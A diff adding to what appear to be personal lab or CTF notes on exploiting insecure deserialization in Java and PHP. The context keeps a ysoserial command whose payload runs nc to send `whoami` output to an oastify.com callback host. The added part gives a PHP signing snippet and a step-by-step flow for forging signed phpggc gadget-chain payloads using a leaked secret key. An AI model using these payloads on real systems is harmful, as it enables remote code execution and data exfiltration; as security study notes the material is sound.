@@ -43,4 +43,17 @@ login -> see on cookie that the session start with 'rO0ABX', it means using java
 java -jar ysoserial-all.jar CommonsCollections4 'nc `whoami`.4ej91z9o7ej3zcfc3u2kxuvsqjwak28r.oastify.com' | base64 -w 0
 ```
 
+### Exploiting PHP deserialization with a pre-built gadget chain
+**Payload** :
+```php
+<?php
+// Method 1: Using hash_hmac (recommended)
+$secret_key = 'secret_key';
+$data = 'data base64'; // Usually raw POST body
 
+$signature = hash_hmac('sha1', $data, $secret_key);
+echo $signature;
+```
+
+**Flow** :
+login -> see source code -> phpinfo.php -> save SECRET_KEY -> cause error on deserialization -> found out the framework used -> using phpggc to create payload based on framework version (don't forget to convert it to base64) -> create signature of payload with secret_key -> send to repeater
